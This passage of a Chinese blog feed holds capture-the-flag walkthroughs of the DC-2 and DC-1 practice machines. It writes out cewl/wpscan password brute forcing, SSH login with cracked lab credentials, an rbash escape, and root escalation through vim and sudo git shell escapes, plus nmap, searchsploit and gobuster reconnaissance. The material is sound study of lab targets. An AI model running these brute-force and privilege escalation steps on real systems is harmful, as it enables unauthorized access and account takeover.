alt="image-20240629161500801"></p><p>可以看到，这里的<code>RHOSTS</code>也设置为必须设置，因此我们可以尝试设置其为目标靶机地址<code>192.168.204.131</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.131<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161754704.png" alt="image-20240629161754704"></p><p>执行运行命令：run&#x2F;exploit</p><p>正常来说，如果成功应用的话会返回提示信息“Meterpreter session 1 opened”</p><p>但是根据打印出来的提示信息，发现无论是执行run还是exploit命令，都没有session被成功创建。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161951832.png" alt="image-20240629161951832"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629162306263.png" alt="image-20240629162306263"></p><p>所以这个漏洞我们没法利用。</p><p>尝试利用其它漏洞，但发现修改都没办法应用执行。所以通过漏洞来实现攻击这一方法遇到了瓶颈。</p><p>ok！既然常规思维无法利用漏洞。那么我们就琢磨一下flag1提示的<code>cewl</code>。</p><blockquote><p>cewl -h ：帮助命令，输出所有可接受的选项参数以及对应的选项描述。</p><p>默认方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://www.ignitetechnologies.in/（指定URL）<br></code></pre></td></tr></table></figure><p>输入命令之后，爬虫会根据<strong>指定的URL</strong>和深度进行爬取，然后打印出可用于密码破解的字典。</p><p>若想将打印出的字典存储为文件，则使用<code>-w Name.txt</code>参数来将其存储为txt文件。</p><p>若想生成指定长度的密码字典，则通过使用<code>-m length</code>选项来设置，保证生成的密码长度至少为九位。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://dc-2/ -w CewlDict.txt<br><br><span class="hljs-built_in">cat</span> CewlDict.txt<br></code></pre></td></tr></table></figure><p>得到一个可用于密码破解的字典（关键字列表）文件：</p><blockquote><p>这里访问的URL是通过域名访问的。因为前面的IP地址被重定向过。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629165118422.png" alt="image-20240629165118422"></p><p>通过 cewl 获得一个可用于密码破解的字典之后。之后的正常思路就是寻找登陆界面进行密码爆破攻击。但是前面在解决重定向问题访问靶机地址后返回的网页中，并没有显示出有关用户登陆的任何界面。</p><p>所以我们还得找！</p><p>之前进行目录爆破的时候，我们获取了三个目录链接：</p><blockquote><p><a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p><a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p><a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p></blockquote><p>在kali（本地物理主机的hosts文件未修改，wp-admin界面依然会被重定向到dc-2造成错误）中分别再次访问这三个网页。</p><ul><li><p><a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p>依然没有任何东西：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629170926175.png" alt="image-20240629170926175"></p></li><li><p><a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p>返回的内容仍然是之前的那些，不知道有何作用，没有找到啥有价值的东西。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629171052842.png" alt="image-20240629171052842"></p></li><li><p><a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p><p>原本是无响应的被重定向的界面，现在返回了一个登陆界面。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629171202086.png" alt="image-20240629171202086"></p></li></ul><p>ok！登陆界面找到啦！！！</p><p>捋一下，现在密码字典有了，登陆界面有了，剩下还需要查找用户名，就可以进行密码爆破了。</p><h2 id="wpscan扫描"><a href="#wpscan扫描" class="headerlink" title="wpscan扫描"></a>wpscan扫描</h2><p>什么是wpscan扫描？</p><table><thead><tr><th align="left"><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。常搭配<code>Nikto</code>使用，一款非常棒的<code>Web</code> 服务器评估工具。</th></tr></thead></table><p>使用教程：<a href="https://blog.csdn.net/weixin_41924764/article/details/120984618%EF%BC%88WPScan%E4%BD%BF%E7%94%A8%E5%AE%8C%E6%95%B4%E6%95%99%E7%A8%8B%E4%B9%8B%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9WordPress%E7%9A%84%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%EF%BC%89">https://blog.csdn.net/weixin_41924764/article/details/120984618（WPScan使用完整教程之记一次对WordPress的渗透过程）</a></p><p>为什么是wpscan？</p><p>因为前面进行指纹识别的时候得到的网站信息，其使用了<code>WordPress</code>框架。</p><h3 id="wpscan扫描WordPress有效用户"><a href="#wpscan扫描WordPress有效用户" class="headerlink" title="wpscan扫描WordPress有效用户"></a>wpscan扫描WordPress有效用户</h3><p>通过扫描在wordpress中有效的用户，确定用户的用户名，进而使用密码字典进行爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://dc-2/ -e u<br></code></pre></td></tr></table></figure><p>执行命令（注意是<code>--url</code>两条<code>-</code>哦）。</p><p>在查询结果中，有一块<code>User(s) Identified:</code>（已认证用户）模块选项：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629180120896.png" alt="image-20240629180120896"></p><p>可以看到，有三个已通过认证的用户：</p><blockquote><p>admin</p><p>jerry</p><p>tom</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> usersname.txt<br>vim usersname.txt<br><span class="hljs-built_in">cat</span> usersname.txt<br></code></pre></td></tr></table></figure><p>新建一个文件，将用户名存入文件中，保存退出，cat查看文件内容。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629182533839.png" alt="image-20240629182533839"></p><h3 id="爆破用户密码"><a href="#爆破用户密码" class="headerlink" title="爆破用户密码"></a>爆破用户密码</h3><p>使用获取得到的用户名字典和密码字典进行爆破，获取可登陆用户账户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://dc-2/ -U usersname.txt -P CewlDict.txt<br></code></pre></td></tr></table></figure><p><code>-U</code>：指定用户名字典</p><p><code>-P</code>：指定密码爆破字典</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629185111829.png" alt="image-20240629185111829"></p><p>爆破出两个普通用户的账户密码咯！</p><blockquote><p>Username: jerry, Password: adipiscing</p><p>Username: tom, Password: parturient</p></blockquote><p>使用这两个账号登陆（这里使用jerry的登陆）：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629185920193.png" alt="image-20240629185920193"></p><p>浏览当前页面信息，并没有一些有用的信息。</p><p>继续浏览其它模块的界面：</p><p>在<code>Pages</code>模块发现了选项Flag2:</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629191506509.png" alt="image-20240629191506509"></p><p>点进去查看其内容：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629191548650.png" alt="image-20240629191548650"></p><blockquote><p>If you can’t exploit WordPress and take a shortcut, there is another way.</p><p>Hope you found another entry point.</p><p>如果你不能利用WordPress走捷径，还有另一种方法。</p><p>希望你能找到另一个入口。</p></blockquote><p>此提示也验证了之前我们试图通过Metasploit进行WordPress漏洞的利用是行不通的。</p><p>再来捋一下，我们目前已经获取了用于登陆的两个用户名和密码。且已经明确了无法通过漏洞利用进行 Getshell 以及提权。</p><p>所以我们接下来可以尝试使用已获取的用户密码连接服务器！</p><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>由前面的端口扫描可知，目标靶机开放的端口只有两个<code>80</code>端口和<code>7744</code>端口。</p><p>80端口常用于web网页http服务。代表http协议。通过上述操作，通过网页操作能获得的信息几近尽头。所以我们从7744端口进行切入。由提示信息，7744端口代表的是ssh协议，用于远程服务器连接。</p><p>跟自己远程连接kali的操作类似，只不过这里指定了7744端口：</p><ul><li>对 jerry 账号进行尝试</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh jerry@192.168.204.131 -p 7744<br></code></pre></td></tr></table></figure><p>但尝试后发现，无论是手打还是复制粘贴，请求都被拒绝了，因此排除密码输入错误的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629192912615.png" alt="image-20240629192912615"></p><ul><li>对 tom 账号进行尝试</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh tom@192.168.204.131 -p 7744<br></code></pre></td></tr></table></figure><p>ok！成功登陆上了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629193140246.png" alt="image-20240629193140246"></p><p>连上之后先 <code>ls</code>查看用户下的目录文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629200237330.png" alt="image-20240629200237330"></p><p>只有flag3文件，usr是系统资源文件，没啥太大的参考意义。</p><p><code>cat flag3.txt</code>查看文件内容，发现没有找到<code>cat</code>命令，判定为命令限制。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629201414849.png" alt="image-20240629201414849"></p><p>使用指令查看能够使用的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629201941121.png" alt="image-20240629201941121"></p><p>有很多命令捏，在末尾处有一个常见的linux文件操作指令<code>vi</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629202023822.png" alt="image-20240629202023822"></p><p>使用 vi 打开 flag3.txt 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi flag3.txt<br></code></pre></td></tr></table></figure><p>权限不够，提示要提权：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629202509198.png" alt="image-20240629202509198"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>根据 flag3.txt 文件的提示，我们应该实现<strong>提权</strong>操作。根据上述<code>compgen -c</code>得到的命令信息，<code>vi</code>是linux下常见的文件操作命令。而且vi是vim的先前版本。通过网络搜索得知，vim能够用来实现提权。</p><blockquote><p>vim的主要用途是作为文本编辑器，但若其作为SUID运行，它将继承root用户的权限，因此它可以读取系统上的所有文件。</p><p>vim.tiny &#x2F;etc&#x2F;shadow 访问高密级文件</p><p>还可以通过vim打开shell</p><p>vim.tiny</p><p>：set shell&#x3D;&#x2F;bin&#x2F;sh</p><p>：shell</p></blockquote><p>首先，先使用<code>vi</code>命令随机打开一个文件（flag3.txt），然后按照保存长度文件的步骤，先<code>Esc + ：号</code>输入<code>set shell=/bin/sh</code>，回车，然后再<code>：号</code>输入<code>shell</code>点击回车即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">：<span class="hljs-built_in">set</span> shell=/bin/sh<br><br>：shell<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629204801206.png" alt="image-20240629204801206"></p><p><code>cd ..</code>返回上一级目录，执行ls的时候发现存在 jerry 和 tom 两个文件夹，可以说是实现了部分提权但仍未获得root用户权限。</p><p>进入jerry文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> jerry<br><br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629205337373.png" alt="image-20240629205337373"></p><p>可以看到有个 flag4 文件，查看其内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi flag4.txt<br></code></pre></td></tr></table></figure><p>（注意不是<code>cat</code>哦！cat被限制了）</p><p>得到如下信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629205603521.png" alt="image-20240629205603521"></p><p>根据提示信息，我们还需要去找到最后一个<code>flag</code>，而且它不给我们提示了。</p><p>接下来尝试<code>rbash绕过</code>来实现提权。</p><table><thead><tr><th align="left">rbash 是 restricted bash 的缩写，意思是受限制的 bash。它与shell的区别在于会限制一些行为，让一些命令无法执行。（本文中cat命令被限制）</th></tr></thead></table><blockquote><ul><li>RBASH 是一种特殊的 shell，它限制了用户的一些操作和权限，例如：<ul><li>不能使用 cd 命令来改变当前目录。</li><li>不能使用 set 命令来改变环境变量或 shell 选项。</li><li>不能使用 unset 命令来取消环境变量或 shell 函数。</li><li>不能使用任何包含 &#x2F; 符号的命令，除非它们在 PATH 环境变量中指定了。</li><li>不能重定向输入或输出，例如使用 &gt;, &lt;, &gt;&gt;, &lt;&lt; 等符号。</li><li>只能执行 PATH 环境变量中指定的命令，而且 PATH 环境变量通常只包含一些基本的命令，例如 ls, cat, echo 等。</li></ul></li><li>RBASH 的目的是为了提高系统的安全性，防止用户执行一些危险或不合法的操作。</li></ul></blockquote><p>学习文档：<a href="https://www.freebuf.com/vuls/376922.html%EF%BC%88Linux%E6%8F%90%E6%9D%83%E4%B9%8Brbash%E7%BB%95%E8%BF%87%EF%BC%89">https://www.freebuf.com/vuls/376922.html（Linux提权之rbash绕过）</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> -p   // 查看环境变量<br><br>BASH_CMDS[a]=/bin/sh;a  // 把/bin/sh;a这个值赋值给目标数组位置<br><br>执行 /bin/bash 命令 // 退出返回当前普通tom用户<br><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin  // 添加环境变量<br><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/bin // 添加环境变量<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629211244365.png" alt="image-20240629211244365"></p><p>添加完环境变量后，<code>ls</code>查看当前目录内容，<code>compgen -c</code>查看当前支持的指令。</p><p>结果显示出了绕过之前<code>compgen -c</code>所没有的很多命令，说明rbash绕过成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212249196.png" alt="image-20240629212249196"></p><p>尝试<code>sudo su</code>提权，但结果还是没能成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212501959.png" alt="image-20240629212501959"></p><p>因此需要继续提权。再仔细查看绕过后系统允许的命令，发现有<code>find</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212610412.png" alt="image-20240629212610412"></p><p>我们上一个靶场利用<code>find</code>命令成功进行了提权，那这次也一样捏！</p><p>首先利用find命令，查看具有SUID权限的可执行二进制文件（命令）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212859976.png" alt="image-20240629212859976"></p><p>发现好像没啥文件可利用。而上一个靶场中<code>find</code>命令也具有SUID权限。</p><p>尝试切换用户！切换到 jerry账户 ！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su &lt;用户名jerry&gt;  // 然后输入jerry的密码即可<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629214309315.png" alt="image-20240629214309315"></p><p><code>sudo -l</code>查看sudo的配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629214442931.png" alt="image-20240629214442931"></p><p>可以得到的信息是，<code> (root) NOPASSWD: /usr/bin/git</code>git命令是root权限的。</p><p><strong>git命令可以实现提权</strong></p><blockquote><p>方法一：</p><p>sudo git help config</p><p>!&#x2F;bin&#x2F;bash 或 !’sh’</p><p>方法二：</p><p>sudo git -p help</p><p>!&#x2F;bin&#x2F;bash </p></blockquote><p>首先先再用户命令行界面输入 <code>sudo git help config</code>，然后他会跳转到一个文件处，什么都不用管，直接复制<code>!/bin/bash 或 !&#39;sh&#39;</code>然后回车。</p><p>可以发现，现在已经是root用户了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629220012985.png" alt="image-20240629220012985"></p><p>但是执行<code>ls</code>的时候可以发现，当前目录下仍然只有 flag3 这个文件。根据命令行显示提示，我们是在root下的 &#x2F;home&#x2F;tom目录 执行的 ls 命令。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629215624770.png" alt="image-20240629215624770"></p><p>执行两次 <code>cd ..</code>退回到 root 根目录。然后再执行一次 ls命令，可以得到<code> final-flag.txt</code>文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> final-flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629220312912.png" alt="image-20240629220312912"></p><p>提权成功！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>第一步工作就是确认目标靶机的IP地址。通过开关靶机或者nmap扫描实现</p></li><li><p>第二步工作就是进行端口扫描，扫描开放端口，试图从中获取一些有用的信息</p></li><li><p>第三步工作就是尝试进行目录爆破。到这一步为止的步骤和dc-1的步骤类似</p></li><li><p>通过<strong>指纹工具</strong>识别出网站使用的框架是<strong>wordpress</strong>，这类框架的漏洞常可以使用<strong>wpscan</strong>进行扫描。使用<strong>wpscan</strong>进行用户名信息扫描。</p></li><li><p>根据<strong>flag提示</strong>得知可以使用<strong>cewl</strong> ，使用其可以针对特定域名（URL）进行密码爆破字典生成。</p></li><li><p>有了<strong>密码字典</strong>以及<strong>用户名信息</strong>之后使用<strong>wpscan</strong>进行有效用户账户的爆破。</p></li><li><p>通过SSH连接来<strong>Getshell</strong>。通过利用可以使用的命令来进行提权，当仍有命令限制的时候，无法获取root权限的时候尝试使用<strong>rbash绕过</strong>来进行提权。</p></li><li><p>切换用户，查看sudo配置信息，试图获取有用信息，<strong>利用命令进行提权</strong>。最后进入root目录查看文件获取最后一个flag。</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-1</title>
    <link href="/2024/07/24/DC-1/"/>
    <url>/2024/07/24/DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a><strong>DC-1</strong></h1><p>首先，需要让kali与靶机出于同一个网段，需要将二者都设置成桥接模式（NAT模式），这样kali在进行地址扫描的时候才能够扫除靶机的IP。</p><h2 id="靶机IP地址确认"><a href="#靶机IP地址确认" class="headerlink" title="靶机IP地址确认"></a>靶机IP地址确认</h2><p><strong>（1）可以直接通过vmvare查看DC-1靶机的MAC地址（00:0C:29:E5:19:3C）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721909942087.png" alt="img"></p><p>在kali中进行地址段扫描：（nmap扫描法）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p>扫描得到的结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910134252.png" alt="img"></p><p>对比mac地址，得到了靶机的IP地址。其他的地址扫描方法以及得到的效果如下：<br>p1：（arp-scan扫描）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo arp-scan -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910168155.png" alt="img"></p><p>p2：（netdiscover扫描 – 速度很慢）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910333640.png" alt="img"></p><p><strong>（2） 也可以通过开关靶机扫描来确定靶机的IP地址</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p> 关闭靶机时，扫描得到的结果：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910370512.png" alt="img"></p><p>打开（或挂起）靶机时，扫描得到的结果：</p><p>会发现多了一个IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910301109.png" alt="img"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>（1）扫描目标靶机IP的开放端口</strong></p><p><code>-sV</code> ：对端口上的服务程序进行扫描，扫描提供服务的版本。</p><p><code>-p </code>： 指定扫描端口，<code>-p- </code>指的是从1到65535端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p- 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910497135.png" alt="img"></p><p><code>-sT</code>：TCP连接扫描，不安全，速度较慢，但相对准确。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -p- 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910518883.png" alt="img"></p><p>根据结果可以看到，开放的端口有<code>22、80、111、51393</code></p><p><strong>（2）扫描开放端口的具体信息</strong></p><p><code>-sT</code> ：TCP连接扫描，不安全，速度较慢，但相对准确</p><p><code>-sV</code> ： 对端口上的服务程序进行扫描，扫描提供服务的版本</p><p><code>-sC</code> ：表示使用默认的脚本进行扫描</p><p><code>-O</code> ：扫描操作系统的版本</p><p><code>-p </code>： 指定扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80,111,51393 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910561368.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910577299.png" alt="img"></p><p>通过80端口呈现出来的信息可以知道，它是一个Drupal网站。</p><p>什么是Drupal呢？通过网上查询，可以知道：</p><table><thead><tr><th align="left">Drupal是一个开源的CMS框架，是一个基于LAMP技术栈的CMS框架，它允许通过安装和卸载模块的方式添加和移除功能。CMS（内容管理系统）是一种软件，允许用户使用各种智能产品中的web浏览器访问网站，添加、发布、编辑和删除内容。</th></tr></thead></table><p>通过<code>searchsploit</code>命令搜索，可以查找到CMS框架的漏洞。</p><table><thead><tr><th align="left">searchsploit是一个用于Exploit-DB的命令行搜索工具。许多漏洞都包含了二进制文件的链接，这些文件不包含在存储库中，但可以在Exploit-DB二进制文件中找到。</th></tr></thead></table><p>输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit drupal cms<br>searchsploit drupal<br></code></pre></td></tr></table></figure><p>得到如下扫描结果：</p><p>可以看到这类cms框架的漏洞不少。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910624007.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910639657.png" alt="img"></p><p>使用浏览器访问靶机IP，显示为一个Drupal网页：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910712860.png" alt="img"></p><p>再次查看扫描得到的端口信息，可以得知80端口服务器下的文件目录，其中有一个<code>install.php</code>的文件，选择它的原因呢，命名是install，下载文件，如果可以自己重新下载一个，并修改其中的参数，也许下载得到的效果就不一样了（&#x2F;doge）。</p><p>使用浏览器访问该文件，在上述网站网址后面加上<code>/install.php</code>。如下，可以看到一些信息，比如第二个提示”若想下载一个不同的数据库，需要在sites文件夹中适当编辑setting.php文件”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910769368.png" alt="img"></p><h2 id="扫描常见UDP端口"><a href="#扫描常见UDP端口" class="headerlink" title="扫描常见UDP端口"></a>扫描常见UDP端口</h2><p><code>--top-ports  n</code>   ： 扫描最常用的n个端口。</p><p>对靶机IP地址进行扫描，扫描其中最常见的20个UDP端口，查看其开放状态，保存信息备用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910815582.png" alt="img"></p><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><p>对靶机进行nmap漏扫：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80,111,51393 192.168.204.129<br></code></pre></td></tr></table></figure><blockquote><p>nmap -script&#x3D;vuln -p 是使用Nmap运行漏洞脚本扫描的命令。</p><p>其中“-script&#x3D;vuln”告知nmap要运行漏洞脚本扫描</p></blockquote><p>扫描结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911011291.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911032733.png" alt="img"></p><p>首先会显示目标主机的IP地址（nmap scan report for targetIP）</p><p>然后会显示扫描过程中检测到的开放的端口号（port    state    service）</p><p>下一个项目就是显示漏洞的检测结果，对于每个开放的端口，显示是否发现了与该端口相关的已知漏洞。如上图扫描结果，关于80端口的漏洞不少。</p><h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><table><thead><tr><th align="left">gobuster是一个用于在网站目录或者文件中进行快速且有效的字典攻击工具。它可以帮助发现目标网站中隐藏的路径。执行的功能有：目录扫描、子域名扫描、文件扩展名扫描、多线程支持、结果报告。多用于渗透测试和安全审计中。</th></tr></thead></table><p>执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.129 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><code>-u</code>：指明待输入的待扫描的网站</p><p><code>-w</code>：指明字典文件的路径</p><p><code>dir</code>：表示使用目录&#x2F;文件枚举模式</p><p>鉴定为：爆破过程太久了啊<del>，不如直接利用漏洞</del></p><p><img 